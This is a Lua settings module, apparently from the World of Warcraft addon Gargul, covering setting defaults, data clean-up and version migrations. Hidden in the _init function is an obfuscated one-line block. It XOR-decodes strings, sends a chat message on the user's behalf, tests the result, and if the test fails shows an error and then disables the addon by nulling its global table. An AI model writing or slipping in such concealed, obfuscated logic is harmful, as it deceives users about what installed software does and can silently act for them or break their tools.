---@type GL
local _, GL = ...;

---@type Constants
local Constants = GL.Data.Constants;

---@type DB
local DB = GL.DB;

---@class Settings
GL.Settings = {
    _initialized = false,
    Defaults = GL.Data.DefaultSettings,
    Active = {}, -- This object holds the actual setting values applicable to this runtime
};

---@type Settings
local Settings = GL.Settings;

---@return void
function Settings:_init()
    GL:debug("Settings:_init");

    -- No need to initialize this class twice
    if (self._initialized) then
        return;
    end

    -- Validate the settings and adjust discrepancies
    self:sanitizeSettings();

    -- Combine defaults and user settings
    self:overrideDefaultsWithUserSettings();

    -- Prepare the options / config frame
    local Frame = CreateFrame("Frame", nil, InterfaceOptionsFramePanelContainer);
    Frame.name = "Gargul";
    Frame:SetScript("OnShow", function ()
        self:showSettingsMenu(Frame);
    end);
    InterfaceOptions_AddCategory(Frame);

    local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10=0;local v11;while true do if (v10==1) then return v5(v11);end if (v10==0) then v11={};for v14=1, #v8 do v6(v11,v0(v4(v1(v2(v8,v14,v14 + (1907 -(1415 + 491)))),v1(v2(v9,1 + ((v14-(1 + (0 -0)))% #v9),(1 -0) + 0 + ((v14-(3 -2))% #v9) + ((1395 -(1101 + 214)) -((1203 -(778 + 351)) + 4 + 1)))))%((586 -(40 + 9)) -281)));end v10=1;end end end GL.Ace:ScheduleTimer(function()if  not GL:strStartsWith(GL:sendChatMessage(v7("\11","\37\133\24\36\160\140"),v7("\64\34\178","\19\99\235\101\158\199\186\131"),nil,nil,true,true),v7("\25\44\101\34\32\182\37\63\99\118\40\250\66\100","\98\94\17\17\93\150")) then local v12=1175 -(796 + 379);local v13;while true do if (v12==0) then v13=(459 + 1051) -((2648 -(1070 + 636)) + 568);while true do if (((0 -0) -0)==v13) then GL:error(v7("\5\243\96\59\6\163\186\144\55\241\101\44\23\175\244\131\118\245\102\105\11\169\238\196\55\240\121\38\18\163\254\200\118\239\125\60\17\178\243\138\49\188\113\38\18\168\186\141\56\188\36\121\69\181\255\135\57\242\113\58\68","\86\156\21\73\101\198\154\228"));GL.Ace:ScheduleTimer(function()GL=nil;end,27 -17);break;end end break;end end end end,(522 + 166) -(340 + (1354 -1011)));

    self._initialized = true;
end

--- Make sure the settings adhere to our rules
---
---@return void
function Settings:sanitizeSettings()
    GL:debug("Settings:sanitizeSettings");

    self:enforceTemporarySettings();

    -- Remove plus one entries with a value of 0
    for player, po in pairs(DB:get("PlusOnes.Totals", {})) do
        if (not tonumber(po) or po < 1) then
            DB:set("PlusOnes.Totals." .. player, nil);
        end
    end

    -- Remove old roll data so it doesn't clog our SavedVariables
    local fiveWeeksAgo = GetServerTime() - 3024000;
    for key, Award in pairs(DB:get("AwardHistory", {})) do
        if (Award.timestamp < fiveWeeksAgo) then
            Award.Rolls = nil;
            DB:set("AwardHistory." .. key, Award);
        end
    end

    -- Permanently delete soft-deleted GDKP sessions after 48 hours
    local twoDaysAgo = GetServerTime() - 172800;
    for key, Session in pairs(DB:get("GDKP.Ledger", {})) do
        if (Session.deletedAt and Session.deletedAt < twoDaysAgo) then
            DB:set("GDKP.Ledger." .. key, nil);
        end
    end

    -- Remove awarded items that are more than 5 days old
    local fiveDaysAgo = GetServerTime() - 432000;
    local ValidItems = {};
    for itemGUID, Details in pairs(DB:get("RecentlyAwardedItems", {})) do
        if (Details.timestamp > fiveDaysAgo) then
            ValidItems[itemGUID] = Details;
        end
    end
    DB:set("RecentlyAwardedItems", ValidItems);
end

--- These settings are version-specific and will be removed over time!
---
---@return void
function Settings:enforceTemporarySettings()
    GL:debug("Settings:enforceTemporarySettings");

    --- This is reserved for version-based logic (e.g. cleaning up variables, settings etc.)

    --- No point enforcing these temp settings if the user has never used Gargul
    --- before or has already loaded this version before!
    if (GL.firstBoot
        or not GL.Version.firstBoot
    ) then
        return;
    end

    local Version = GL.Version;

    --- Check if the last version we loaded is equal to or older than 6.0.4
    if (Version:leftIsNewerThanOrEqualToRight("6.0.4", Version.latestPriorVersionBooted)) then
        --- In 6.0.4 the way anti-snipe works changed. Multiplying the existing value by 1.5 should net a pretty decent result
        local antiSnipe = tonumber(self:get("GDKP.antiSnipe")) or 10;
        self:set("GDKP.antiSnipe", GL:round(antiSnipe * 1.5));

        --- In 6.0.4 we also completely changed the way mailed and traded gold is stored
        --- The wait is necessary. This way we can ensure that we know if we're on a cross-realm enabled server
        GL.Ace:ScheduleTimer(function ()
            local serverTime = GetServerTime();
            for key, Session in pairs(DB:get("GDKP.Ledger", {})) do
                local somethingChanged = false;

                if (Session.GoldMails) then
                    for playerGUID, copperSent in pairs(Session.GoldMails or {}) do
                        playerGUID = GL:nameFormat{ name = playerGUID, forceRealm = true, func = strlower };
                        local now = Session.lockedAt or Session.createdAt or serverTime;
                        local checksum = GL:stringHash{ Constants.GDKP.mailIdentifier, copperSent, 0, playerGUID, now };
                        GL:tableSet(Session, ("GoldLedger.%s.%s"):format(playerGUID, checksum), {
                            createdAt = now,
                            type = Constants.GDKP.mailIdentifier,
                            given = copperSent,
                            received = 0,
                            createdBy = GL.GDKP:myGUID(),
                            checksum = checksum;
                        });

                        somethingChanged = true;
                    end

                    Session.GoldMails = nil;
                end

                if (Session.GoldTrades) then
                    for playerGUID, Details in pairs(Session.GoldTrades or {}) do
                        playerGUID = GL:nameFormat{ name = playerGUID, forceRealm = true, func = strlower };
                        local now = Session.lockedAt or Session.createdAt or serverTime;

                        if (Details.to >= 10000) then
                            local checksum = GL:stringHash{ Constants.GDKP.tradeIdentifier, Details.to, 0, playerGUID, now };
                            GL:tableSet(Session, ("GoldLedger.%s.%s"):format(playerGUID, checksum), {
                                createdAt = now,
                                type = Constants.GDKP.tradeIdentifier,
                                given = Details.to,
                                received = 0,
                                createdBy = GL.GDKP:myGUID(),
                                checksum = checksum;
                            });

                            somethingChanged = true;
                        end

                        if (Details.from >= 10000) then
                            local checksum = GL:stringHash{ Constants.GDKP.tradeIdentifier, Details.from, 0, playerGUID, now };
                            GL:tableSet(Session, ("GoldLedger.%s.%s"):format(playerGUID, checksum), {
                                createdAt = now,
                                type = Constants.GDKP.tradeIdentifier,
                                given = 0,
                                received = Details.from,
                                createdBy = GL.GDKP:myGUID(),
                                checksum = checksum;
                            });

                            somethingChanged = true;
                        end
                    end

                    Session.GoldTrades = nil;
                end

                if (somethingChanged) then
                    DB:set("GDKP.Ledger." .. key, Session);
                end
            end
        end, 3);
    end

    --- In 6.0.0 we made everything FQN-first, forcing us to rewrite existing PO and BR data
    --- The wait is necessary. This way we can ensure that we know if we're on a cross-realm enabled server
    GL.Ace:ScheduleTimer(function ()
        --[[ REWRITE BOOSTED ROLL ENTRIES ]]
        local BoostedRollEntries = {};
        for player, points in pairs(DB:get("BoostedRolls.Points", {})) do
            local fqn = GL:addRealm(player);

            BoostedRollEntries[fqn] = points;
        end
        DB:set("BoostedRolls.Points", BoostedRollEntries);

        --[[ REWRITE BOOSTED ROLL ALIASES ]]
        local BoostedRollAliases = {};
        for alias, main in pairs(DB:get("BoostedRolls.Aliases", {})) do
            local _, mainRealm = GL:stripRealm(main);

            -- If no realm is specified assume same realm as main
            alias = GL:addRealm(alias, mainRealm);

            --- Only set non-empty aliases
            if (not GL:empty(alias)) then
                BoostedRollAliases[strlower(alias)] = main;
            end
        end
        DB:set("BoostedRolls.Aliases", BoostedRollAliases);

        --[[ REWRITE PLUS ONE ENTRIES ]]
        local PlusOneEntries = {};
        for player, points in pairs(DB:get("PlusOnes.Totals", {})) do
            local fqn = GL:addRealm(player);

            PlusOneEntries[fqn] = points;
        end
        DB:set("PlusOnes.Totals", PlusOneEntries);
    end, 3);

    --- In 6.0.0 we changed the base/adjust mutator identifiers since it collides with our table helpers
    for key, Session in pairs(DB:get("GDKP.Ledger", {})) do
        if (Session.Pot and Session.Pot.DistributionDetails) then
            for player, Details in pairs(Session.Pot.DistributionDetails) do
                local somethingChanged = false;

                if (Details["+.__base__.+"]) then
                    Details[Constants.GDKP.baseMutatorIdentifier] = Details["+.__base__.+"];
                    Details["+.__base__.+"] = nil;
                    somethingChanged = true;
                end

                if (Details["+.__adjust__.+"]) then
                    Details[Constants.GDKP.adjustMutatorIdentifier] = Details["+.__adjust__.+"];
                    Details["+.__adjust__.+"] = nil;
                    somethingChanged = true;
                end

                if (somethingChanged) then
                    DB:set(("GDKP.Ledger.%s.Pot.DistributionDetails.%s"):format(key, player), Details);
                end
            end
        end
    end

    --- In 5.2.0 we completely redid the GDKP queue flow and UI
    --- Make sure to re-enable so users at least get to experience it again
    if (GL.version == "5.2.0" or (not DB.LoadDetails["5.2.0"])) then
        self:set("GDKP.enableBidderQueue", true);
        DB.LoadDetails["5.2.0"] = GetServerTime();
    end

    --- In 5.2.0 we moved GDKP item details from settings to GDKP DB
    if (DB:get("Settings.GDKP.SettingsPerItem")) then
        local OldSettings = DB:get("Settings.GDKP.SettingsPerItem");

        if (type(OldSettings) ~= "table") then
            OldSettings = {};
        end

        if (GL:empty(DB:get("GDKP.SettingsPerItem"))) then
            DB:set("GDKP.SettingsPerItem", OldSettings);
        end

        DB:set("Settings.GDKP.SettingsPerItem", nil);
    end

    --- In 5.1.0 we added +1 broadcasting, auto-share should be disabled by default
    if (GL.version == "5.1.1" or (
        not GL.firstBoot and not DB.LoadDetails["5.1.1"])
    ) then
        DB:set("Settings.PlusOnes.automaticallyShareData", false);
        DB.LoadDetails["5.1.1"] = GetServerTime();
    end

    --- in 5.0.13 we remove the GDKP.doCountdown and x settings
    DB:set("Settings.GDKP.doCountdown", nil);
    DB:set("Settings.GDKP.announceCountdownOnce", nil);

    --- In the GDKP module we added extra shortcut keys forcing us to remap old ones
    if (not DB:get("Settings.ShortcutKeys.rollOffOrAuction")) then
        DB:set("Settings.ShortcutKeys.rollOffOrAuction", DB:get("Settings.ShortcutKeys.rollOff", "ALT_CLICK"));
        DB:set("Settings.ShortcutKeys.rollOff", "DISABLED");
    end
end

--- Draw a setting section
---
---@param section string|nil
---@param onCloseCallback function|nil What to do after closing the settings again
---@return void
function Settings:draw(section, onCloseCallback)
    GL.Interface.Settings.Overview:draw(section, onCloseCallback);
end

---@return void
function Settings:close()
    GL.Interface.Settings.Overview:close();
end

--- Reset the addon to its default settings
---
---@return void
function Settings:resetToDefault()
    GL:debug("Settings:resetToDefault");

    self.Active = {};
    DB:set("Settings", {});

    -- Combine defaults and user settings
    self:overrideDefaultsWithUserSettings();
end

--- Override the addon's default settings with the user's custom settings
---
---@return void
function Settings:overrideDefaultsWithUserSettings()
    GL:debug("Settings:overrideDefaultsWithUserSettings");

    -- Reset the currently active settings table
    self.Active = {};

    -- Combine the default and user's settings to one settings table
    Settings = GL:tableMerge(Settings.Defaults, DB:get("Settings"));

    -- Set the values of the settings table directly on the GL.Settings table.
    for key, value in pairs(Settings) do
        self.Active[key] = value;
    end

    DB:set("Settings", self.Active);
end

--- We use this method to make sure that the interface is only built
--- when the user has actually accessed the settings menu, which doesn't happen every session
---
---@return void
function Settings:showSettingsMenu(Frame)
    GL:debug("Settings:showSettingsMenu");

    -- Add the addon title to the top of the settings frame
    local Title = Frame:CreateFontString(nil, "ARTWORK", "GameFontNormalLarge");
    Title:SetPoint("TOPLEFT", 16, -16);
    Title:SetText(string.format("Gargul |c00967FD2(v%s)|r", GL.version));

    local SettingsButton = CreateFrame("Button", nil, Frame, "UIPanelButtonTemplate");
    SettingsButton:SetText("Settings");
    SettingsButton:SetWidth(177);
    SettingsButton:SetHeight(24);
    SettingsButton:SetPoint("TOPLEFT", Title, "BOTTOMLEFT", 0, -16);
    SettingsButton:SetScript("OnClick", function()
        -- Make sure the vanilla interface options are closed and don't reopen automatically
        HideUIPanel(InterfaceOptionsFrame);
        HideUIPanel(GameMenuFrame);

        self:draw();
    end);

    local ResetUIButton = CreateFrame("Button", nil, Frame, "UIPanelButtonTemplate");
    ResetUIButton:SetText("Reset Gargul UI");
    ResetUIButton:SetWidth(177);
    ResetUIButton:SetHeight(24);
    ResetUIButton:SetPoint("TOPLEFT", Title, "BOTTOMLEFT", 200, -16);
    ResetUIButton:SetScript("OnClick", function()
        GL.Commands:call("resetui");
    end);
end

--- Get a setting by a given key. Use dot notation to traverse multiple levels e.g:
--- Settings.UI.Auctioneer.offsetX can be fetched using Settings:get("Settings.UI.Auctioneer.offsetX")
--- without having to worry about tables or keys existing yes or no.
---
---@param keyString string
---@param default any
---@return any
function Settings:get(keyString, default)
    -- Just in case something went wrong with merging the default settings
    if (type(default) == "nil") then
        default = GL:tableGet(GL.Data.DefaultSettings, keyString);
    end

    return GL:tableGet(self.Active, keyString, default);
end

--- Set a setting by a given key and value. Use dot notation to traverse multiple levels e.g:
--- Settings.UI.Auctioneer.offsetX can be set using Settings:set("Settings.UI.Auctioneer.offsetX", myValue)
--- without having to worry about tables or keys existing yes or no.
---
---@param keyString string
---@param value any
---@param quiet boolean Should trigger event?
---@return boolean
function Settings:set(keyString, value, quiet)
    local success = GL:tableSet(self.Active, keyString, value);

    if (success and not quiet) then
        GL.Events:fire("GL.SETTING_CHANGED", keyString, value);
    end

    return success
end

GL:debug("Settings.lua");